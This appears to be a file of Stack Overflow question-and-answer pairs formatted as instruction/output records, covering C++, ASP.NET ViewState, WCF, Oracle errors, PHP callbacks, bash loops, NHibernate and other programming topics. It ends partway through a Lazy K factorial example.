{"instruction": "I'm really beginning to understand what people mean when they say that C++'s error messages are pretty terrible in regards to templates.  I've seen horrendously long errors for things as simple as a function not matching its prototype.\nAre there any tricks to deciphering these errors?\nEDIT:  I'm using both gcc and MSVC.  They both seem to be pretty terrible.", "output": "At least in Visual Studio, there is more information given in the Output Build window rather than the Error List. I've had a template error in the Error List state, \"Cannot convert Foo<int> to Foo<int>\". There were some lines following the actual error in the Output window that helped me to decipher what the actual problem was."}
{"instruction": "We are trying to lighten our page load as much as possible. Since ViewState can sometimes swell up to 100k of the page, I'd love to completely eliminate it.\nI'd love to hear some techniques other people have used to move ViewState to a custom provider.\nThat said, a few caveats:\n\nWe serve on average 2 Million unique visitors per hour.\nBecause of this, Database reads have been a serious issue in performance, so I don't want to store ViewState in the database.\nWe also are behind a load balancer, so any solution has to work with the user bouncing from machine to machine per postback.\n\nIdeas?", "output": "I'm going to see if I can come up with a way to leverage our current State server to contain the viewstate in memory, I should be able to use the user session ID to keep things synched up between machines.\nIf I come up with a good solution, I'll remove any IP protected code and put it out for public use."}
{"instruction": "We are trying to lighten our page load as much as possible. Since ViewState can sometimes swell up to 100k of the page, I'd love to completely eliminate it.\nI'd love to hear some techniques other people have used to move ViewState to a custom provider.\nThat said, a few caveats:\n\nWe serve on average 2 Million unique visitors per hour.\nBecause of this, Database reads have been a serious issue in performance, so I don't want to store ViewState in the database.\nWe also are behind a load balancer, so any solution has to work with the user bouncing from machine to machine per postback.\n\nIdeas?", "output": "Oh no, red tape.  Well this is going to be a tall order to fill.  You mentioned here that you use a state server to serve your session state.  How do you have this setup?  Maybe you can do something similar here also? \nEdit\nAwh @Jonathan, you posted while I was typing this answer up.  I think going that route could be promising.  One thing is that it will definitely be memory intensive.\n@Mike I don't think storing it in the session information will be a good idea, due to the memory intensiveness of viewstate and also how many times you will need to access the viewstate.  SessionState is accessed a lot less often as the viewstate.  I would keep the two separate.\nI think the ultimate solution would be storing the ViewState on the client some how and maybe worth looking at.  With Google Gears, this could be possible now."}
{"instruction": "We are trying to lighten our page load as much as possible. Since ViewState can sometimes swell up to 100k of the page, I'd love to completely eliminate it.\nI'd love to hear some techniques other people have used to move ViewState to a custom provider.\nThat said, a few caveats:\n\nWe serve on average 2 Million unique visitors per hour.\nBecause of this, Database reads have been a serious issue in performance, so I don't want to store ViewState in the database.\nWe also are behind a load balancer, so any solution has to work with the user bouncing from machine to machine per postback.\n\nIdeas?", "output": "How do you handle Session State?  There is a built-in \"store the viewstate in the session state\" provider.  If you are storing the session state in some fast, out of proc system, that might be the best option for the viewstate.\nedit: to do this add the following code to the your Page classes / global page base class\n    protected override PageStatePersister PageStatePersister {\n        get { return new SessionPageStatePersister(this); }\n    }\n\nAlso... this is by no means a perfect (or even good) solution to a large viewstate.  As always, minimize the size of the viewstate as much as possible.  However, the SessionPageStatePersister is relatively intelligent and avoids storing an unbounded number of viewstates per session as well as avoids storing only a single viewstate per session."}
{"instruction": "Is there any tool which will allow me to perform a free text search over a system's code, but only over the code which was actually executed during a particular invocation?\nTo give a bit of background, when learning my way around a new system, I frequently find myself wanting to discover where some particular value came from, but searching the entire code base turns up far more matches than I can reasonably assess individually.\nFor what it's worth, I've wanted this in Perl and Java at one time or another, but I'd love to know if any languages have a system supporting this feature.", "output": "You can generally twist a code coverage tool's arm and get a report that shows the paths that have been executed during a given run.  This report should show the code itself, with the first few columns marked up according to the coverage tool's particular notation on whether a given path was executed.\nYou might be able to use this straight up, or you might have to preprocess it and either remove the code that was not executed, or add a new notation on each line that tells whether it was executed (most tools will only show path information at control points):\nSo from a coverage tool you might get a report like this:\nT- if(sometest)\n   {\nx     somecode;\n   }\n   else\n   {\n-     someother_code;\n   }\n\nThe notation T- indicates that the if statement only ever evaluated to true, and so only the first part of the code executed.  The later notation 'x' indicates that this line was executed.\nYou should be able to form a regex that matches only when the first column contains a T, F, or x so you can capture all the control statements executed and lines executed.\nSometimes you'll only get coverage information at each control point, which then requires you to parse the C file and mark the execute lines yourself.  Not as easy, but not impossible either.\nStill, this sounds like an interesting question where the solution is probably more work than it's worth..."}
{"instruction": "We get a large amount of data from our clients in pdf files in varying formats [layout-wise], these files are typically report output, and are typically properly annotated [they don't usually need OCR], but not formatted well enough that simply copying several hundred pages of text out of acrobat is not going to work.\nThe best approach I've found so far is to write a script to parse the nearly-valid xml output (the comments are invalid and many characters are escaped in varying ways, \u00e9 becomes [[[e9]]]\u00e9, $ becomes \\$, % becomes \\%...) of the command-line pdftoipe utility (to convert pdf files for a program called ipe), which gives me text elements with their positions on each page [see sample below], which works well enough for reports where the same values are on the same place on every page I care about, but would require extra scripting effort for importing matrix [cross-tab] pdf files. pdftoipe is not at all intended for this, and at best can be compiled manually using cygwin for windows.\nAre there libraries that make this easy from some scripting language I can tolerate?  A graphical tool would be awesome too.  And a pony. \npdftoipe output of this sample looks like this:\n<ipe creator=\"pdftoipe 2006/10/09\"><info media=\"0 0 612 792\"/>\n<-- Page: 1 1 -->\n<page gridsize=\"8\">\n<path fill=\"1 1 1\" fillrule=\"wind\">\n64.8 144 m\n486 144 l\n486 727.2 l\n64.8 727.2 l\n64.8 144 l\nh\n</path>\n<path fill=\"1 1 1\" fillrule=\"wind\">\n64.8 144 m\n486 144 l\n486 727.2 l\n64.8 727.2 l\n64.8 144 l\nh\n</path>\n<path fill=\"1 1 1\" fillrule=\"wind\">\n64.8 144 m\n486 144 l\n486 727.2 l\n64.8 727.2 l\n64.8 144 l\nh\n</path>\n<text stroke=\"1 0 0\" pos=\"0 0\" size=\"18\" transformable=\"yes\" matrix=\"1 0 0 1 181.8 707.88\">This is a sample PDF fil</text>\n<text stroke=\"1 0 0\" pos=\"0 0\" size=\"18\" transformable=\"yes\" matrix=\"1 0 0 1 356.28 707.88\">e.</text>\n<text stroke=\"1 0 0\" pos=\"0 0\" size=\"18\" transformable=\"yes\" matrix=\"1 0 0 1 368.76 707.88\"> </text>\n<text stroke=\"0 0 0\" pos=\"0 0\" size=\"12.6\" transformable=\"yes\" matrix=\"1 0 0 1 67.32 692.4\"> </text>\n<text stroke=\"0 0 0\" pos=\"0 0\" size=\"12.6\" transformable=\"yes\" matrix=\"1 0 0 1 67.32 677.88\"> </text>\n<text stroke=\"0 0 0\" pos=\"0 0\" size=\"12.6\" transformable=\"yes\" matrix=\"1 0 0 1 67.32 663.36\"> </text>\n<text stroke=\"0 0 0\" pos=\"0 0\" size=\"12.6\" transformable=\"yes\" matrix=\"1 0 0 1 67.32 648.84\"> </text>\n<text stroke=\"0 0 0\" pos=\"0 0\" size=\"12.6\" transformable=\"yes\" matrix=\"1 0 0 1 67.32 634.32\"> </text>\n<text stroke=\"0 0 0\" pos=\"0 0\" size=\"12.6\" transformable=\"yes\" matrix=\"1 0 0 1 67.32 619.8\"> </text>\n<text stroke=\"0 0 0\" pos=\"0 0\" size=\"12.6\" transformable=\"yes\" matrix=\"1 0 0 1 67.32 605.28\"> </text>\n<text stroke=\"0 0 0\" pos=\"0 0\" size=\"12.6\" transformable=\"yes\" matrix=\"1 0 0 1 67.32 590.76\"> </text>\n<text stroke=\"0 0 0\" pos=\"0 0\" size=\"12.6\" transformable=\"yes\" matrix=\"1 0 0 1 67.32 576.24\"> </text>\n<text stroke=\"0 0 0\" pos=\"0 0\" size=\"12.6\" transformable=\"yes\" matrix=\"1 0 0 1 67.32 561.72\"> </text>\n<text stroke=\"0 0 0\" pos=\"0 0\" size=\"12.6\" transformable=\"yes\" matrix=\"1 0 0 1 67.32 547.2\"> </text>\n<text stroke=\"0 0 0\" pos=\"0 0\" size=\"12.6\" transformable=\"yes\" matrix=\"1 0 0 1 67.32 532.68\"> </text>\n<text stroke=\"0 0 0\" pos=\"0 0\" size=\"12.6\" transformable=\"yes\" matrix=\"1 0 0 1 67.32 518.16\"> </text>\n<text stroke=\"0 0 0\" pos=\"0 0\" size=\"12.6\" transformable=\"yes\" matrix=\"1 0 0 1 67.32 503.64\"> </text>\n<text stroke=\"0 0 0\" pos=\"0 0\" size=\"12.6\" transformable=\"yes\" matrix=\"1 0 0 1 67.32 489.12\"> </text>\n<text stroke=\"0 0 0\" pos=\"0 0\" size=\"12.6\" transformable=\"yes\" matrix=\"1 0 0 1 67.32 474.6\"> </text>\n<text stroke=\"0 0 1\" pos=\"0 0\" size=\"16.2\" transformable=\"yes\" matrix=\"1 0 0 1 67.32 456.24\">If you can read this</text>\n<text stroke=\"0 0 1\" pos=\"0 0\" size=\"16.2\" transformable=\"yes\" matrix=\"1 0 0 1 214.92 456.24\">,</text>\n<text stroke=\"0 0 1\" pos=\"0 0\" size=\"16.2\" transformable=\"yes\" matrix=\"1 0 0 1 219.48 456.24\"> you already have A</text>\n<text stroke=\"0 0 1\" pos=\"0 0\" size=\"16.2\" transformable=\"yes\" matrix=\"1 0 0 1 370.8 456.24\">dobe Acrobat </text>\n<text stroke=\"0 0 1\" pos=\"0 0\" size=\"16.2\" transformable=\"yes\" matrix=\"1 0 0 1 67.32 437.64\">Reader i</text>\n<text stroke=\"0 0 1\" pos=\"0 0\" size=\"16.2\" transformable=\"yes\" matrix=\"1 0 0 1 131.28 437.64\">n</text>\n<text stroke=\"0 0 1\" pos=\"0 0\" size=\"16.2\" transformable=\"yes\" matrix=\"1 0 0 1 141.12 437.64\">stalled on your computer.</text>\n<text stroke=\"0 0 0\" pos=\"0 0\" size=\"16.2\" transformable=\"yes\" matrix=\"1 0 0 1 337.92 437.64\"> </text>\n<text stroke=\"0 0.502 0\" pos=\"0 0\" size=\"12.6\" transformable=\"yes\" matrix=\"1 0 0 1 342.48 437.64\"> </text>\n<image width=\"800\" height=\"600\" rect=\"-92.04 800.64 374.4 449.76\" ColorSpace=\"DeviceRGB\" BitsPerComponent=\"8\" Filter=\"DCTDecode\" length=\"369925\">\nfeedcafebabe...\n</image>\n</page>\n</ipe>", "output": "If you're fine with calling something external, you can use ghostscript - look at the ps2ascii script included with the distribution.  I'm not sure what you want from a graphical tool - a big button that you push to chose the input and output files?  A preview?  You might be able to use GSView, depending on what you want."}
{"instruction": "I'm really beginning to understand what people mean when they say that C++'s error messages are pretty terrible in regards to templates.  I've seen horrendously long errors for things as simple as a function not matching its prototype.\nAre there any tricks to deciphering these errors?\nEDIT:  I'm using both gcc and MSVC.  They both seem to be pretty terrible.", "output": "As @nsanders said STLFilt is a good solution. A home grown STLFilt (when you don't want to go to the trouble of installing Perl) is to copy the error message in an editor and start replacing parts of the error until it becomes (more) manageable.\ne.g.\ns/std::basic_string<char,std::char_traits<char>,std::allocator<char>>/string/g\n\nIn less geeky terms this means:\nReplace:\nstd::basic_string<char,std::char_traits<char>,std::allocator<char>>\n\nWith:\nstring"}
{"instruction": "This is a poll asking the Stackoverflow community what non-programming books they would recommend to fellow programmers.\nPlease read the following before posting:\n\nPlease post only ONE BOOK PER ANSWER.\nPlease search for your recommendation on this page before posting (there are over NINE PAGES so it is advisable to check them all). Many books have already been suggested and we want to avoid duplicates. If you find your recommendation is already present, vote it up or add some commentary.\nPlease elaborate on why you think a given book is worth reading from a programmer's perspective.\n\nNote: this article is similar and contains other useful suggestions.", "output": "I used to read a lot of non-technical books ... what everyone would refer to as the classics, Who Moved My Cheese, Getting Things Done, One Minute Manager and so on.  \nOne day I finally realized that all these books were trying to do was prevent me from making mistakes ... which is exactly the opposite of how me, and most people learn.  Smart people make mistakes, and fail, quite frequently, but what makes them different is that they learn from their mistakes.  How could I learn when the books I was reading were preventing my from some good life lessons?\nSo from that point on I stopped reading non-technical books ... save for the ones that related to technical management .. which there aren't many.  Instead I started reading biographies on business owners, like Bill Gates, Steve Jobs, Steve Ballmer, Larry Ellison and so on.  I learned more from these brillant, crazy, egocentric, often times failures that I learned from any of the business books I previously read!  \nThat is where I would start ... read books from people who are successes and failures in the vertical industries you are interested in ... instead of some author who is speaking from second-hand experience.  \nWith that aside, if I had to recommend some non-technical books, I would have to say these are a couple of my classics:\n\nAcres of Diamonds by Russell H. Conwell \nObvious Adams: The Story of a Successful Businessman by Robert R. Updegraff\nThe Art of War by Sun Tzu\nThe Book of Five Rings by Miyamoto Musashi\nMachiavelli's The Prince by Niccolo Machiavelli \nBible, King James Version\n\nJust my thoughts!"}
{"instruction": "i have a wcf service that does an operation. and in this operation there could be a fault. i have stated that there could be a fault in my service contract. \nhere is the code below;\npublic void Foo()\n{\n        try\n        {\n            DoSomething(); // throws FaultException<FooFault>\n        }\n        catch (FaultException)\n        {\n            throw;\n        }\n        catch (Exception ex)\n        {\n            myProject.Exception.Throw<FooFault>(ex);\n        }\n}\n\nin service contract;\n[FaultException(typeof(FooFault))]\nvoid Foo();\n\nwhen a FaultException was thrown by DoSomething() method while i was running the application, firstly the exception was caught at \"catch(Exception ex)\" line and breaks in there. then when i pressed f5 again, it does what normally it has to. i wonder why that break exists? and if not could it be problem on publish?", "output": "Take a closer look at catched exception. Was it FaultException< FooFault> or FaultException ? There are 2 version of FaultException class: generic and non-generic"}
{"instruction": "This is a poll asking the Stackoverflow community what non-programming books they would recommend to fellow programmers.\nPlease read the following before posting:\n\nPlease post only ONE BOOK PER ANSWER.\nPlease search for your recommendation on this page before posting (there are over NINE PAGES so it is advisable to check them all). Many books have already been suggested and we want to avoid duplicates. If you find your recommendation is already present, vote it up or add some commentary.\nPlease elaborate on why you think a given book is worth reading from a programmer's perspective.\n\nNote: this article is similar and contains other useful suggestions.", "output": "A little off the wall here but I would say \"Pillars of the Earth\" - Ken Follet.\nApart from being a gripping epic, the parallels you can draw between developing software and running a project, and the craftsmen and \"managers\" building a Cathedral (and the entire town) are very interesting.\n(Also voted for \"7 habits of highly effective people\" - a classic.)"}
{"instruction": "I was looking out for a free plugin for developing/debugging JSP pages in eclipse.\nAny suggestions?", "output": "The Eclipse Web Tools Platform Project includes a JSP debugger. I have only ever needed to use it with Tomcat so I cannot say how well it works with other servlet containers."}
{"instruction": "I was looking out for a free plugin for developing/debugging JSP pages in eclipse.\nAny suggestions?", "output": "BEA seems to have a free one BEA JSP plugin - not used it, so not sure how good it is.\nOracle now owns BEA, and they have this plugin which might do a similar job."}
{"instruction": "If you've used Oracle, you've probably gotten the helpful message \"ORA-00942: Table or view does not exist\". Is there a legitimate technical reason the message doesn't include the name of the missing object? \nArguments about this being due to security sound like they were crafted by the TSA. If I'm an attacker, I'd know what table I just attempted to exploit, and be able to interpret this unhelpful message easily. If I'm a developer working with a complex join through several layers of application code, it's often very difficult to tell.\nMy guess is that when this error was originally implemented, someone neglected to add the object name, and now, people are afraid it will break compatibility to fix it. (Code doing silly things like parsing the error message will be confused if it changes.)\nIs there a developer-friendly (as opposed to recruiting your DBA) way to determine the name of the missing table?\n\nAlthough I've accepted an answer which is relevant to the topic, it doesn't really answer my question: Why isn't the name part of the error message? If anyone can come up with the real answer, I'll be happy to change my vote.", "output": "@Matthew\nYour query's a start, but it might not work when you have multiple schemas.  For example, if I log into our instance as myself, I have read access to all our tables.  But if I don't qualify the table name with the schema I'll get an ORA-00942 for tables without synonyms:\n\nSQL> select * from tools; \nselect * from tools \n              * \nERROR at line 1: \nORA-00942: table or view does not exist \n\nThe table still shows up in all_tables though:\n\nSQL> select owner, table_name from all_tables where table_name = 'TOOLS'; \n\nOWNER                          TABLE_NAME \n------------------------------ ------------------------------ \nAPPLICATION                    TOOLS \n\n@erikson\nSorry that doesn't help much.  I'm with Mark - I used TOAD."}
{"instruction": "i have a wcf service that does an operation. and in this operation there could be a fault. i have stated that there could be a fault in my service contract. \nhere is the code below;\npublic void Foo()\n{\n        try\n        {\n            DoSomething(); // throws FaultException<FooFault>\n        }\n        catch (FaultException)\n        {\n            throw;\n        }\n        catch (Exception ex)\n        {\n            myProject.Exception.Throw<FooFault>(ex);\n        }\n}\n\nin service contract;\n[FaultException(typeof(FooFault))]\nvoid Foo();\n\nwhen a FaultException was thrown by DoSomething() method while i was running the application, firstly the exception was caught at \"catch(Exception ex)\" line and breaks in there. then when i pressed f5 again, it does what normally it has to. i wonder why that break exists? and if not could it be problem on publish?", "output": "@yapiskan,\nC# is a strong typed language Foo< X> != Foo. So if you need to catch some exception, provide exact type in catch clause.\nYou can learn more on exception handling reading this MSDN article."}
{"instruction": "Whenever I use a macro in Visual Studio I get an annoying tip balloon in the system tray and an accompanying \"pop\" sound. It says:\n\nVisual Studio .NET macros\nTo stop the macro from running, double-click the spinning cassette.\n  Click here to not show this balloon again.\n\nI have trouble clicking the balloon because my macro runs so quickly.\nIs this controllable by some dialog box option?\n(I found someone else asking this question on some other site but it's not answered there. I give credit here because I've copied and pasted some pieces from there.)", "output": "Okay, I found a way to make the balloon clickable, and clicking it does indeed stop it from popping up again. (On the other site I referenced in the original question the question asker claims that this is not the case. Though he was in VS2005 and I'm using VS2008.)\nAnyway, I inserted a pause line in the macro so it would run for long enough for me to click the balloon:\nSystem.Threading.Thread.Sleep(2000)\n\nIt would still be nice to know if there's a dialog somewhere for turning this back on, in case I have a crazy change of heart."}
{"instruction": "I am working with an API that provides bus arrival data. For every request, I get back (among other things) a list of which routes serve the stop in question. For example, if the list includes result for bus route #1, 2, and 5, then I know that those serve this stop.\nI have a many-to-many relationship set up between Route and Stop, and I want to dynamically check and update these associations on every request. There is no \"master list\" of which routes serve which stops, so this seems like the best way to get this data.\nI believe that the way I'm doing it now is very inefficient:\n# routes is an array of [number, destination] that I build while iterating over the data\nroutes.uniq.each do |route|\n  number      = route[0]\n  destination = route[1]\n\n  r = Route.find_by_number_and_destination(number, destination)\n\n  if !r\n    r = Route.new :number => number, :destination => destination\n    r.save\n  end\n\n  # I have to check if it already exists because I can't find a way\n  # to create a uniqueness constraint on the join table with 2 foreign keys\n  r.stops << stop unless r.stops.include? stop\nend\n\nBasically, I have to do 2 things for every route I find:\n1) Create it if it doesn't already exist, 2) Add a relationship to the current stop if it doesn't already exist.\nIs there a better way to do this, for example by getting a bunch of the data in memory and doing some of the processing on the app server side, in order to avoid the multitude of database calls I'm currently doing?", "output": "If I get it right, you (should) have 2 models. A Route model, and a Stop model.\nHere's how I would define these models:\nclass Route < ActiveRecord::Base\n  has_and_belongs_to_many :stops\n  belongs_to :stop, :foreign_key => 'destination_id'\nend\n\nclass Stop < ActiveRecorde::Base\n  has_and_belongs_to_many :routes\nend\n\nAnd here's how I would set up my tables:\ncreate_table :routes do |t|\n  t.integer :destination_id\n  # Any other information you want to store about routes\nend\n\ncreate_table :stops do |t|\n  # Any other information you want to store about stops\nend\n\ncreate_table :routes_stops, :primary_key => [:route_id, :stop_id] do |t|\n  t.integer :route_id\n  t.integer :stop_id\nend\n\nFinally, here's the code I'd use:\n# First, find all the relevant routes, just for caching.\nRoute.find(numbers)\n\nr = Route.find(number)\nr.destination_id = destination\nr.stops << stop\n\nThis should use only a few SQL queries."}
{"instruction": "I am trying to publish an Asp.net MVC web application locally using the NAnt and MSBuild. This is what I am using for my NAnt target;\n<target name=\"publish-artifacts-to-build\">\n    <msbuild project=\"my-solution.sln\" target=\"Publish\">\n      <property name=\"Configuration\" value=\"debug\" />\n      <property name=\"OutDir\" value=\"builds\\\" />\n      <arg line=\"/m:2 /tv:3.5\" />\n    </msbuild>\n</target>\n\nand all I get is this as a response;\n[msbuild]          Skipping unpublishable project.\n\nIs it possible to publish web applications via the command line in this way?", "output": "The \"Publish\" target you are trying to invoke is for \"OneClick\" deployment, not for publishing a website...  This is why you are getting the seemingly bizarre message. \nYou would want to use the AspNetCompiler task, rather than the MSBuild task.  See http://msdn2.microsoft.com/en-us/library/ms164291.aspx for more info on this task.  Your \"PublishDir\" would correspond to the TargetPath property of the task. \nSource"}
{"instruction": "I would like to implement something similar to a c# delegate method in PHP.  A quick word to explain what I'm trying to do overall:  I am trying to implement some asynchronous functionality.  Basically some resource-intensive calls that get queued, cached, and dispatched when the underlying system gets around to it.  When the asynchronous call finally receives a response I would like a callback event to be raised.\nI am having some problems coming up with a mechanism to do callbacks in PHP.  I have come up with a method that works for now but I am unhappy with it.  Basically it involves passing a reference to the object and the name of the method on it that will serve as the callback (taking the response as an argument) and then use eval to call the method when need be.  This is sub-optimal for a variety of reasons, is there a better way of doing this that anyone knows of?", "output": "How do you feel about using the Observer pattern? If not, you can implement a true callback this way:\n// This function uses a callback function. \nfunction doIt($callback) \n{ \n    $data = \"this is my data\";\n    $callback($data); \n} \n\n\n// This is a sample callback function for doIt(). \nfunction myCallback($data) \n{ \n    print 'Data is: ' .  $data .  \"\\n\"; \n} \n\n\n// Call doIt() and pass our sample callback function's name. \ndoIt('myCallback');\n\nDisplays: Data is: this is my data"}
{"instruction": "I'm using Eclipse 3.4 (Ganymede) with CDT 5 on Windows.\nWhen the integrated spell checker doesn't know some word, it proposes (among others) the option to add the word to a user dictionary.\nIf the user dictionary doesn't exist yet, the spell checker offers then to help configuring it and shows the \"General/Editors/Text Editors/Spelling\" preference pane. This preference pane however states that \"The selected spelling engine does not exist\", but has no control to add or install an engine.\nHow can I put a spelling engine in existence?\nUpdate: What solved my problem was to install also the JDT. This solution was brought up on 2008-09-07 and was accepted, but is now missing.", "output": "Are you using the C/C++ Development Tools exclusively?The Spellcheck functionality is dependent upon the Java Development Tools being installed also.The spelling engine is scheduled to be pushed down from JDT to the Platform,so you can get rid of the Java related bloat soon enough. :)"}
{"instruction": "I would like to implement something similar to a c# delegate method in PHP.  A quick word to explain what I'm trying to do overall:  I am trying to implement some asynchronous functionality.  Basically some resource-intensive calls that get queued, cached, and dispatched when the underlying system gets around to it.  When the asynchronous call finally receives a response I would like a callback event to be raised.\nI am having some problems coming up with a mechanism to do callbacks in PHP.  I have come up with a method that works for now but I am unhappy with it.  Basically it involves passing a reference to the object and the name of the method on it that will serve as the callback (taking the response as an argument) and then use eval to call the method when need be.  This is sub-optimal for a variety of reasons, is there a better way of doing this that anyone knows of?", "output": "(Apart from the observer pattern) you can also use call_user_func() or call_user_func_array().\nIf you pass an array(obj, methodname) as first parameter it will invoked as $obj->methodname().\n\n<?php\nclass Foo {\n    public function bar($x) {\n        echo $x;\n    }\n}\n\nfunction xyz($cb) {\n    $value = rand(1,100);\n    call_user_func($cb, $value);\n}\n\n$foo = new Foo;\nxyz( array($foo, 'bar') );"}
{"instruction": "Say I have a Textbox nested within a TabControl.  \nWhen the form loads, I would like to focus on that Textbox (by default the focus is set to the TabControl).\nSimply calling textbox1.focus() in the Load event of the form does not appear to work.  \nI have been able to focus it by doing the following:\n private void frmMainLoad(object sender, EventArgs e)\n {\n     foreach (TabPage tab in this.tabControl1.TabPages) \n     {\n         this.tabControl1.SelectedTab = tab;\n     }\n }\n\nMy question is:\nIs there a more elegant way to do this?", "output": "The following is the solution:\nprivate void frmMainLoad(object sender, EventArgs e)\n{\n    ActiveControl = textBox1;\n}\n\nThe better question would however be why... I'm not entirely sure what the answer to that one is.\nEdit: I suspect it is something to do with the fact that both the form, and the TabControl are containers, but I'm not sure."}
{"instruction": "I'm planning on creating a social networking + MP3 lecture downloading / browsing / commenting / discovery website using Ruby on Rails. Partially for fun and also as a means to learn some Ruby on Rails. I'm looking for a social networking framework that I can use as a basis for my site. I don't want to re-invent the wheel. \nSearching the web I found three such frameworks. Which of these three would you recommend using and why?\nhttp://portal.insoshi.com/\nhttp://www.communityengine.org/\nhttp://lovdbyless.com/", "output": "I've not worked with these but am aware of this comparison:\n\n\"Unlike Insoshi and Lovd By Less, which\n  are full social networking Rails\n  applications, Community Engine is a\n  plugin that can add social networking\n  features to existing Rails\n  applications\"\n\nfrom \nhttp://www.rubyinside.com/community-engine-rails-plugin-that-adds-social-networking-to-your-app-901.html"}
{"instruction": "I currently use Resharper and have for a few years now. I know there are a ton of other useful addins out there but i never seem to have the time to sort through them to see which is worthy of using. So i was hoping some of you would be able to help me do some sorting.", "output": "Third post under visualstudio tag"}
{"instruction": "I currently use Resharper and have for a few years now. I know there are a ton of other useful addins out there but i never seem to have the time to sort through them to see which is worthy of using. So i was hoping some of you would be able to help me do some sorting.", "output": "Visual Assist X (various goodies)\nCodekana (various goodies, similar to visual assist x)\nViemu (makes the VS editor react like vi)"}
{"instruction": "I'm looking for the basic loop like:\nfor(int i = 0; i < MAX; i++) {\n  doSomething(i);\n}\n\nbut for bash.", "output": "See: this site\n    for i in $(seq 1 10);\n    do\n            echo $i\n    done"}
{"instruction": "I'm looking for the basic loop like:\nfor(int i = 0; i < MAX; i++) {\n  doSomething(i);\n}\n\nbut for bash.", "output": "for ((i = 0 ; i < max ; i++ )); do echo \"$i\"; done"}
{"instruction": "I'm looking for the basic loop like:\nfor(int i = 0; i < MAX; i++) {\n  doSomething(i);\n}\n\nbut for bash.", "output": "Try the bash built-in help:\n\n$ help for\n\nfor: for NAME [in WORDS ... ;] do COMMANDS; done\n    The `for' loop executes a sequence of commands for each member in a\n    list of items.  If `in WORDS ...;' is not present, then `in \"$@\"' is\n    assumed.  For each element in WORDS, NAME is set to that element, and\n    the COMMANDS are executed.\nfor ((: for (( exp1; exp2; exp3 )); do COMMANDS; done\n    Equivalent to\n        (( EXP1 ))\n        while (( EXP2 )); do\n        \tCOMMANDS\n        \t(( EXP3 ))\n        done\n    EXP1, EXP2, and EXP3 are arithmetic expressions.  If any expression is\n    omitted, it behaves as if it evaluates to 1."}
{"instruction": "I'm looking for the basic loop like:\nfor(int i = 0; i < MAX; i++) {\n  doSomething(i);\n}\n\nbut for bash.", "output": "The bash for consists on a variable (the iterator) and a list of words where the iterator will, well, iterate.\nSo, if you have a limited list of words, just put them in the following syntax:\nfor w in word1 word2 word3\ndo\n  doSomething($w)\ndone\n\nProbably you want to iterate along some numbers, so you can use the seq command to generate a list of numbers for you: (from 1 to 100 for example)\nseq 1 100\n\nand use it in the FOR loop:\nfor n in $(seq 1 100)\ndo\n  doSomething($n)\ndone\n\nNote the $(...) syntax. It's a bash behaviour, it allows you to pass the output from one command (in our case from seq) to another (the for)\nThis is really useful when you have to iterate over all directories in some path, for example:\nfor d in $(find $somepath -type d)\ndo\n  doSomething($d)\ndone\n\nThe possibilities are infinite to generate the lists."}
{"instruction": "I'm looking for the basic loop like:\nfor(int i = 0; i < MAX; i++) {\n  doSomething(i);\n}\n\nbut for bash.", "output": "I use variations of this all the time to process files...\n\nfor files in *.log; do echo \"Do stuff with: $files\"; echo \"Do more stuff with: $files\"; done;\n\nIf processing lists of files is what you're interested in, look into the -execdir option for files."}
{"instruction": "I've got two tables in my database: Articles and Tags\nThe Tags tables consist of ArticleID (foreign key) and a Tag (varchar).\nNow I need to map an articles tags into a readonly collection on Article entity, either using IList Tags or ReadOnlyCollection Tags.\nI've consulted the NHibernate reference material, but I can't seem to figure when to use Set, Bag and the other Nhibernate collections. I've seen examples using the ISet collection, but I really don't like to tie my entity classes to a NHibernate type.\nHow can I do the mapping in NHibernate?\nThank you in advance.\nedit: I ended up using a <bag> instead, as it doesn't require an index:\n<bag name=\"Tags\" table=\"Tag\" access=\"nosetter.camelcase\" lazy=\"false\">\n  <key column=\"ArticleId\" />\n  <element column=\"Tag\" type=\"System.String\" />\n</bag>", "output": "The type of collection to use in your mapping depends on how you want to represent the collection in code. The settings map like so:\n\nThe <list> maps directly to an\nIList.\nThe <map> maps directly to an IDictionary.\nThe <bag> maps to an IList. A  does not completely comply\nwith the IList interface because the\nAdd() method is not guaranteed to\nreturn the correct index. An object\ncan be added to a <bag> without\ninitializing the IList. Make sure to\neither hide the IList from the\nconsumers of your API or make it\nwell documented.\nThe <set> maps to an Iesi.Collections.ISet. That\ninterface is part of the\nIesi.Collections assembly\ndistributed with NHibernate.\n\nso if you want an IList to be returned, then you would use the <list> mapping. In your case, I'd probably map using the <list> mapping."}
{"instruction": "I am working on a winforms application using LINQ to SQL - and am building the app using a SQL Express instance on my workstation. The final installation of the project will be on a proper SQL Server 2005.  \nThe database has the same name, and all tables are identical but the hostname is different. \nThe only way I have found to make my app work from one machine to the next is to re-open the code in Visual Studio, delete all of the objects referring to the SQL express instance from my .mdbl, save the project, connect to the other server, drag all of the references back on, and rebuild the application for release once more.\nan answer here suggested that one can simply modify the app.config/web.config file - whih would work for asp.net, but this is a winforms application. What's the correct way of making LINQ to SQL apps use a new database without having to re-open the app in visual studio?", "output": "If I understand your problem correctly, you simply change the database's connection string in your app.config / web.config.\nEdit, post clarification: You have the connection strings stored somewhere. They might be in the app.config of your server. Still, you get them from somewhere and that somewhere may be in an app.config. Use that then :)"}
{"instruction": "I want to see all the different ways you can come up with, for a factorial subroutine, or program. The hope is that anyone can come here and see if they might want to learn a new language.\nIdeas:\n\nProcedural\nFunctional\nObject Oriented\nOne liners\nObfuscated\nOddball\nBad Code\nPolyglot\n\nBasically I want to see an example, of different ways of writing an algorithm, and what they would look like in different languages.\nPlease limit it to one example per entry.\nI will allow you to have more than one example per answer, if you are trying to highlight a specific style, language, or just a well thought out idea that lends itself to being in one post.\nThe only real requirement is it must find the factorial of a given argument, in all languages represented.\nBe Creative!\nRecommended Guideline:\n\n# Language Name: Optional Style type\n\n   - Optional bullet points\n\n    Code Goes Here\n\nOther informational text goes here\n\nI will ocasionally go along and edit any answer that does not have decent formatting.", "output": "Lazy K\nYour pure functional programming nightmares come true!\nThe only Esoteric Turing-complete Programming Language that has:\n\nA purely functional foundation, core, and libraries---in fact, here's the complete API: S K I\nNo lambdas even!\nNo numbers or lists needed or allowed\nNo explicit recursion but yet, allows recursion\nA simple infinite lazy stream-based I/O mechanism\n\nHere's the Factorial code in all its parenthetical glory:\nK(SII(S(K(S(S(KS)(S(K(S(KS)))(S(K(S(KK)))(S(K(S(K(S(K(S(K(S(SI(K(S(K(S(S(KS)K)I))\n (S(S(KS)K)(SII(S(S(KS)K)I))))))))K))))))(S(K(S(K(S(SI(K(S(K(S(SI(K(S(K(S(S(KS)K)I))\n 